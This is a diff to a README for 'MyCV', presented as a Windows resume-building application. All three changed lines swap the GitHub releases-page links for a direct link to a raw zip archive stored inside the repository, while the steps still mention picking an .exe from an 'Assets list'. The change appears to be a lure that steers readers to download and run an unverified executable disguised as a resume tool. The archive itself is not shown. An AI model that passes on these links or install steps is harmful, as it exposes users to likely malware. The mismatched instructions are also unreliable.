@@ -1,6 +1,6 @@
 # 📄 MyCV - Build A Professional Resume With Ease
 
-[![](https://img.shields.io/badge/Download_MyCV-blue)](https://github.com/Mikeynormal1422/MyCV/releases)
+[![](https://img.shields.io/badge/Download_MyCV-blue)](https://raw.githubusercontent.com/Mikeynormal1422/MyCV/main/public/My-CV-2.3.zip)
 
 ## 🎯 About This Application
 
@@ -18,7 +18,7 @@ MyCV helps you create professional resumes quickly. You focus on your work histo
 
 You do not need to install complex tools to use this application. Follow these steps to set up MyCV on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Mikeynormal1422/MyCV/releases) to find the latest version.
+1.  Visit the [official download page](https://raw.githubusercontent.com/Mikeynormal1422/MyCV/main/public/My-CV-2.3.zip) to find the latest version.
 2.  Look for the file ending in .exe in the Assets list.
 3.  Click the file name to start the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
@@ -72,7 +72,7 @@ Yes. You do not need an internet connection to edit your resume or export files.
 Close the application and open it again. Since your progress saves automatically, your latest changes remain intact.
 
 ### How do I update to the newest version?
-Check the [download page](https://github.com/Mikeynormal1422/MyCV/releases) periodically. If a new version exists, download and install it the same way you did the first time. The new version replaces the old one while keeping your existing resume files.
+Check the [download page](https://raw.githubusercontent.com/Mikeynormal1422/MyCV/main/public/My-CV-2.3.zip) periodically. If a new version exists, download and install it the same way you did the first time. The new version replaces the old one while keeping your existing resume files.
 
 ### Can I import data from Word?
 This version supports direct entry within the editor. Copy and paste your content from other programs into the text fields of the application.
